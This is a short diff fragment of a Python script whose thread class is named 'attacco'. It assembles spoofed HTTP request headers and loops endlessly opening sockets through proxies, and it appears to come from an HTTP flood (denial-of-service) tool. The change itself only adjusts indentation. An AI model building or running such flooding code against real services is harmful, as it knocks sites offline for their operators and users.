@@ -8299,8 +8299,7 @@ class attacco(threading.Thread):
 httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 while nload:
             time.sleep(1)
-           
-        while 1:
+	while 1:
             try:
                 a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 a.connect((proxy[0], int(proxy[1])))
